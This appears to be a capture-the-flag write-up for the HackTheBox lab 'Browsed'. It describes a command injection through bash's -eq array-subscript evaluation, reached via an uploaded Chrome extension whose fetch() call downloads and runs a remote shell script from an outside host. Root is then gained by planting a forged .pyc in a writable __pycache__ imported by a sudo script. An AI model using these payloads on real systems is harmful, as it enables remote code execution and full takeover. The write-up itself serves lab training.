# Browsed — HackTheBox

**Category:** Linux  
**Difficulty:** Medium 

---

## nmap

```
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
```

---

## enumeration

there is an option to upload a chrome extension in a zip file which would be used by a developer and would reach back with feedback
(files must be directly inside the archive not in a folder)

what it does is after upload:

```
uploads your ZIP
extracts it to /tmp/extension_[RANDOM_ID]/
runs Chrome with your extension loaded
visits localhost/ and browsedinternals.htb
captures the output to /tmp/extension_[RANDOM_ID]/output.log
```

from the log file we see `browsedinternals.htb` which is a gitea instance

also `file://` is blocked

in `http://browsedinternals.htb/` explore page we found a repo `larry/MarkdownPreview`
we also found `/home/larry` in a log file which means a user larry is there

there were 2 backup files but they were empty

in the `routine.sh` file I found a command injection vuln:

```
/routines/<rid> endpoint calls subprocess.run(["./routines.sh", rid]) (no shell)
rid parameter is passed directly to the bash script without validation
the bash script uses [[ "$1" -eq 0 ]] - this can be exploited!
its on http://localhost:5000/ internally (which we can send requests to through the chrome extension that we provide)
```

I thought that if the developer is visiting `browsedinternals.htb` then he would also already be logged in so I attempted to fetch his cookie and got it:

```
Cookie: i_like_gitea=6fc09ae422291998; _csrf=Z0hZfdAef_n_-qdV0dGRDy3PqHY6MTc2ODEzNTIzMDI4Mzk2NjY2MA
```

but sadly he was not logged in

---

## foothold — command injection

so I launched `routine.sh` and `app.py` in localhost and tried to exploit the command injection in different ways. after some research I stumbled upon a github issue:
https://github.com/koalaman/shellcheck/issues/3088

so I tried exploiting it via `a[$(command)]` and it worked!

`a[$(command)]` works because before equating, `-eq` first evaluates both sides:

```
a['array'] - searches for keyword 'array' in the array named a
a[$(command)] - first executes the command then searches for the output in array 'a'
```

in the locally hosted `app.py` I tried:

```
routines/a[$(curl http://localhost:8000/test)]
```

but didnt work even after url encoding it — so I tried encoding the command in base64 then decoding it and executing it through bash which worked!

prepared a base64 payload which would curl our `shell.sh` hosted on our http server and pipe it through bash:

```bash
echo 'curl http://10.10.14.106:8000/shell.sh | bash' | base64
```

then using this in the chrome extension code:

```javascript
fetch('http://localhost:5000/routines/a[$(echo "Y3VybCBodHRwOi8vMTAuMTAuMTQuMTA2OjgwMDAvc2hlbGwuc2ggfCBiYXNoCg==" | base64 -d | bash)]');
```

we got shell as user larry and got the user flag!

---

## privilege escalation

```bash
sudo -l
# (root) NOPASSWD: /opt/extensiontool/extension_tool.py
```

`/opt/extensiontool/extension_tool.py` is used to interact with extensions. its features include:

```
--ext EXT:   type=str, default='.':    which extension to load present inside extensions directory (no write privs)
--bump:      {major,minor,patch}:      version bump type
--zip [ZIP]: type=str, nargs='?':      output zip file name in temp directory (creates one if it doesnt exist)
--clean:     action='store_true':      clean up temporary files after packaging
```

I also found larry's ssh keys in his home directory so I have an easier way in now and a better shell

doing:

```bash
sudo /opt/extensiontool/extension_tool.py --ext /tmp --zip test
# shows: Use one of the following extensions : ['Fontify', 'Timer', 'ReplaceImages']
```

so I made a dir in `/tmp` named `Fontify` and did:

```bash
sudo /opt/extensiontool/extension_tool.py --ext /tmp/Fontify --zip test
```

but that didnt seem much helpful

there is also a `__pycache__` dir and its world writeable!

also `extension_tool.py` was importing `validate_manifest` and `clean_temp_files` from `extension_utils.py` which means we can create our own `.pyc` cache file of a malicious python file containing our own code in the `__pycache__` dir which would be loaded by `extension_utils.py`

the name of the pycache file it creates is: `extension_utils.cpython-312.pyc`

also one more thing I read is that the malicious python file we create must include all the functions it imports which in this case is `validate_manifest` and `clean_temp_files`

one more thing — before using the pycache file it first checks if the original source code has been modified or not. by default, it compares the source file's magic byte, last-modified timestamp and size with the metadata of the source file stored in the `.pyc` file — so when we make the `.pyc` file we need to match its metadata with that of the original `extension_utils.py`

doing:

```bash
python3 -c 'import sys; print(sys.path)'
# ['', '/usr/lib/python312.zip', '/usr/lib/python3.12', '/usr/lib/python3.12/lib-dynload', '/usr/local/lib/python3.12/dist-packages', '/usr/lib/python3/dist-packages']
```

this shows the paths where python will look for modules. here `''` means current dir

in Python 3.7+, Python changed from timestamp/size validation to hash-based validation for `.pyc` files. I used a public code to check whether its time-based or hash-based and it turned out to be hash-based

old method `.pyc` header:

```
[Magic: 4 bytes][Timestamp: 4 bytes][Size: 4 bytes][???]
checked only size, magic byte and timestamp
```

new method (3.7+) `.pyc` header:

```
[Magic: 4 bytes][Timestamp: 4 bytes][Hash: 4 bytes][Flags: 4 bytes]
Timestamp can be 0 (ignored)
Hash is the hash of the source code
Flags shows the Bitfield (bit 0 = hash-based, bit 1 = check source)
```

the header of the file showed:

```
Magic: cb0d0d0a        (Python 3.12 signature)
Timestamp: 0           (1970-01-01 - which means ignored!)
Size/Hash: 1742727379  (Hash of the source)
Flags: 0x000004dd      (bit 0 = 1 → hash-based validation)
```

so using python we copied the metadata of the original `.pyc` file and put it on our custom malicious `.pyc` file containing basic python SUID bash generator malicious code. then we moved the file to the world writable `/opt/extensiontool/__pycache__` dir

after running:

```bash
sudo /opt/extensiontool/extension_tool.py --ext Timer
```

it checked in the `__pycache__` dir and found the `.pyc` which passed the validation check and when it imported the module (the whole module gets imported even though only certain functions were called, and also executes every code in it), our code ran and we got ROOT!!

---

## proof

![root](../proofs/browsed.png)
